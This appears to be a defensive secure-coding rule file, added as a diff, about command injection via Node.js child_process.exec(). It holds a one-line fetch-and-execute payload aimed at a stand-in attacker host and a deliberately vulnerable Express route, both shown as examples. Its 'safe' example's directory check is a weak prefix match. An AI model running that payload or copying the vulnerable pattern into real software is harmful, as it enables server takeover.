@@ -1,0 +1,30 @@
+{
+  "rule_id": "SC-JS-CMD-001",
+  "version": "1.0.0",
+  "title": "Command Injection via child_process",
+  "summary": "User-controlled input flows into child_process.exec() as part of a shell command string. Because exec() spawns a shell, an attacker can inject shell metacharacters (;, |, &&, $(), backticks) to execute arbitrary commands on the server with the privileges of the Node.js process.",
+
+  "why_it_matters": "Command injection is among the most critical vulnerability classes — successful exploitation gives an attacker full control of the server process. With a single crafted input like `; curl attacker.com/shell.sh | sh`, an attacker can install backdoors, exfiltrate secrets and environment variables, pivot to internal networks, or destroy data. Node.js applications are especially prone because child_process.exec() invokes /bin/sh by default, making every shell metacharacter a potential injection vector. Automated scanners and penetration testing tools routinely test for this class of vulnerability.",
+
+  "how_to_fix": "Replace exec() with execFile() or spawn() using explicit argument arrays. These functions bypass the shell entirely, so metacharacters are treated as literal strings.\n\n1. Replace every child_process.exec(cmd) call with child_process.execFile(binary, argsArray).\n2. Never construct command strings by concatenating user input — pass each argument as a separate array element.\n3. Validate user input against a strict allowlist of expected values before use.\n4. If shell features (pipes, redirects, globbing) are genuinely needed, set the specific values yourself — never let user input flow into the shell string.\n5. Consider whether the functionality can be reimplemented in JavaScript without shelling out (e.g., use fs/path modules instead of calling shell commands).\n6. If you must use exec(), set the shell option to false and pass arguments as an array via spawn().",
+
+  "unsafe_example": "// UNSAFE: user input concatenated into shell command\nconst { exec } = require('child_process');\n\napp.get('/list', (req, res) => {\n  const dir = req.query.dir;\n  exec('ls -la ' + dir, (err, stdout) => {\n    res.send(stdout);\n  });\n});",
+
+  "safe_example": "// SAFE: execFile with explicit argument array, no shell invocation\nconst { execFile } = require('child_process');\nconst path = require('path');\n\nconst ALLOWED_DIRS = ['/opt/reports', '/opt/exports'];\n\napp.get('/list', (req, res) => {\n  const dir = path.resolve(req.query.dir);\n  if (!ALLOWED_DIRS.some(allowed => dir.startsWith(allowed))) {\n    return res.status(400).send('Directory not allowed');\n  }\n  execFile('ls', ['-la', dir], (err, stdout) => {\n    if (err) return res.status(500).send('Error listing directory');\n    res.type('text/plain').send(stdout);\n  });\n});",
+
+  "developer_notes": "child_process.exec() always spawns a shell (/bin/sh on Unix, cmd.exe on Windows). child_process.execFile() does NOT spawn a shell — it invokes the binary directly with the argument array, so shell metacharacters have no special meaning. child_process.spawn() also avoids the shell by default, but accepts a { shell: true } option that re-enables it — never set shell: true with user input. Note that even with execFile(), argument injection is still possible if the target binary interprets arguments unsafely (e.g., passing --output=/etc/passwd to curl), so always validate inputs.",
+
+  "verification_checklist": [
+    "All child_process calls use execFile() or spawn() instead of exec()",
+    "Arguments are passed as an explicit array, never concatenated into a string",
+    "User input is validated against an allowlist before being passed as arguments",
+    "The shell option is not set to true on spawn() or execFile() calls",
+    "Error output is not leaked directly to the user response"
+  ],
+
+  "references": [
+    {"title": "CWE-78: Improper Neutralization of Special Elements used in an OS Command", "url": "https://cwe.mitre.org/data/definitions/78.html"},
+    {"title": "OWASP Top 10 A03:2021 Injection", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
+    {"title": "OWASP OS Command Injection Defense Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"}
+  ]
+}
